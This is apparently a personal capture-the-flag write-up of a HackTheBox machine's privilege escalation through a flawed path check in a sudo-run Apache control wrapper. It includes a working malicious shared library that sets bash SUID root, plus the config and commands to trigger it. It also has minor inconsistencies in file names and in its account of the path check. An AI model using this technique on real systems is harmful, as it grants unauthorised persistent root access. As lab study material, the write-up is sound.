# SafeApache2ctl Privilege Escalation - Shared Library Hijacking Technique Breakdown
- Found `HTB` Guardian privilege Escalation path very interesting , challenging box nonetheless.
- Taking notes for future references, referenced blog post on Guardian by [HYH](https://www.hyhforever.top/posts/2025/09/htb-guardian/).


####  Overview
This exploit leverages a path validation vulnerability in `safeapache2ctl` to load a malicious shared library with root privileges, resulting in persistent privilege escalation through `SUID` binary creation.


### Vulnerability Analysis

#### Core Vulnerability: Flawed Path Validation
- The `safeapache2ctl` binary contains a vulnerable function `is_unsafe_line()` with improper path sanitization:

```bash
// Flawed validation logic
if (local_1018[0] == '/') {  // Only check absolute paths
    iVar1 = starts_with(local_1018,"/home/mark/confs/");
    if (iVar1 == 0) {
        // Block access
    }
}
// Relative paths bypass this check entirely!
```

### Security Control Bypass
- Intended Security: Restrict file operations to `/home/mark/confs/`
- Actual Behavior: Any file in the allowed directory can be referenced, including malicious shared libraries
- Bypass Method: Use absolute paths within the trusted directory that point to malicious content

### Attack Vectors

#### Exploitable Directives
The vulnerability affects three Apache configuration directives:
- `Include` - File inclusion
- `IncludeOptional` - Optional file inclusion
- `LoadModule` ⭐ Most Dangerous - Shared library loading
#### Why `LoadModule` is Critical

```c
// Apache processes this directive:
LoadModule evil_module /home/mark/confs/evil.so

// Which triggers:
dlopen("/home/mark/confs/evil.so")  // Loads shared library
// Constructor executes automatically with Apache's privileges
```
### Payloads
#### Payload Development
- `evil.c`, create malicious library
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```
- `__attribute__((constructor))` - Function executes automatically on library load
- `setuid(0)` - Elevates privileges to root
- `chmod +s /bin/bash` - Creates persistent SUID root binary
#### Exploit Configuration
- `exploit.conf `, create exploit configuration and achieves code execution via shared library constructor
```bash
LoadModule evil_module /home/mark/confs/evil.so
```

### Reproduce The Attack
- Place `evil.c` in `/home/mark/`
- Place `evil.conf` in `/home/mark/conf`
- Compile the shared library 
```bash
$ gcc -shared -fPIC -o /home/mark/confs/evil.so /home/mark/evil.c
```
- Run `safeapache2ctl` as `sudo`
```bash
$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
```
- Run `bash` in privileged mode
```bash
$ bash -p
$ whoami  
root
```
